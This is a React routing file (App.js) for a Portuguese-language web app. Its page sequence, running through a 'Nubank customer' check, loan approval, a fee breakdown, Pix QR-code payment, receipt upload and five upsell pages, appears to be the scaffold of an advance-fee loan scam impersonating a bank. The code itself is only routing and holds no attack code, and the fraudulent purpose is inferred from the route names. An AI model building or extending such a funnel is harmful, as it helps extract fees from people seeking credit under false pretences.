import React, { useEffect } from 'react';
import { BrowserRouter, Routes, Route, useLocation } from 'react-router-dom';

function ScrollToTop() {
  const { pathname } = useLocation();

  useEffect(() => {
    window.scrollTo(0, 0);
  }, [pathname]);

  return null;
}
import HomePage from './pages/HomePage';
import ResultPage from './pages/ResultPage';
import ChatPage from './pages/ChatPage';
import WarningPage from './pages/WarningPage';
import AccountVerifiedPage from './pages/AccountVerifiedPage';
import DataVerificationPage from './pages/DataVerificationPage';
import AvailableValuesPage from './pages/AvailableValuesPage';
import DataForReceivingPage from './pages/DataForReceivingPage';
import PixConfirmationPage from './pages/PixConfirmationPage';
import TaxBreakdownPage from './pages/TaxBreakdownPage';
import QRCodePaymentPage from './pages/QRCodePaymentPage';
import PaymentVerificationPage from './pages/PaymentVerificationPage';
import SettingsPage from './pages/SettingsPage';
import ProfileQuestionsPage from './pages/ProfileQuestionsPage';
import CreditAuthorizationPage from './pages/CreditAuthorizationPage';
import LoanPriorityPage from './pages/LoanPriorityPage';
import NubankCustomerPage from './pages/NubankCustomerPage';
import CreditStatusPage from './pages/CreditStatusPage';
import LoanApprovedPage from './pages/LoanApprovedPage';
import LoanSummaryPage from './pages/LoanSummaryPage';
import InstallmentSelectionPage from './pages/InstallmentSelectionPage';
import LoanTermsPage from './pages/LoanTermsPage';
import TransferConfirmationPage from './pages/TransferConfirmationPage';
import DueDateSelectionPage from './pages/DueDateSelectionPage';
import Upsell1Page from './pages/Upsell1Page';
import Upsell2Page from './pages/Upsell2Page';
import Upsell3Page from './pages/Upsell3Page';
import Upsell4Page from './pages/Upsell4Page';
import Upsell5Page from './pages/Upsell5Page';
import UpsellPaymentPage from './pages/UpsellPaymentPage';
import ReceiptUploadPage from './pages/ReceiptUploadPage';
import FinalPage from './pages/FinalPage';
import VSLPage from './pages/VSLPage';
import { initUserLogger } from './services/userLogger';
import DevOnlyRoute from './components/DevOnlyRoute';
import './App.css';

function App() {
  useEffect(() => {
    initUserLogger();

    try {
      localStorage.removeItem('funnelData');
      sessionStorage.removeItem('userData');
    } catch (error) {
      console.error('Error clearing storage:', error);
    }
  }, []);

  return (
    <BrowserRouter>
      <ScrollToTop />
      <Routes>
        <Route path="/" element={<HomePage />} />
        <Route path="/resultado" element={<ResultPage />} />
        <Route path="/chat" element={<ChatPage />} />
        <Route path="/aviso" element={<WarningPage />} />
        <Route path="/conta-verificada" element={<AccountVerifiedPage />} />
        <Route path="/verificando-dados" element={<DataVerificationPage />} />
        <Route path="/valores-disponiveis" element={<AvailableValuesPage />} />
        <Route path="/dados-recebimento" element={<DataForReceivingPage />} />
        <Route path="/confirmar-pix" element={<PixConfirmationPage />} />
        <Route path="/detalhamento-taxas" element={<TaxBreakdownPage />} />
        <Route path="/pagamento-qrcode" element={<QRCodePaymentPage />} />
        <Route path="/verificar-pagamento" element={<PaymentVerificationPage />} />
        <Route path="/receipt-upload" element={<ReceiptUploadPage />} />
        <Route path="/enviar-comprovante" element={<ReceiptUploadPage />} />
        <Route path="/settings" element={<DevOnlyRoute><SettingsPage /></DevOnlyRoute>} />
        <Route path="/perguntas-perfil" element={<ProfileQuestionsPage />} />
        <Route path="/autorizacao-credito" element={<CreditAuthorizationPage />} />
        <Route path="/prioridade-emprestimo" element={<LoanPriorityPage />} />
        <Route path="/cliente-nubank" element={<NubankCustomerPage />} />
        <Route path="/status-credito" element={<CreditStatusPage />} />
        <Route path="/emprestimo-aprovado" element={<LoanApprovedPage />} />
        <Route path="/resumo-emprestimo" element={<LoanSummaryPage />} />
        <Route path="/selecionar-parcelas" element={<InstallmentSelectionPage />} />
        <Route path="/termos-emprestimo" element={<LoanTermsPage />} />
        <Route path="/confirmacao-transferencia" element={<TransferConfirmationPage />} />
        <Route path="/selecionar-vencimento" element={<DueDateSelectionPage />} />
        <Route path="/vsl" element={<VSLPage />} />
        <Route path="/upsell-1" element={<Upsell1Page />} />
        <Route path="/upsell-2" element={<Upsell2Page />} />
        <Route path="/upsell-3" element={<Upsell3Page />} />
        <Route path="/upsell-4" element={<Upsell4Page />} />
        <Route path="/upsell-5" element={<Upsell5Page />} />
        <Route path="/upsell-payment" element={<UpsellPaymentPage />} />
        <Route path="/final" element={<FinalPage />} />
      </Routes>
    </BrowserRouter>
  );
}

export default App;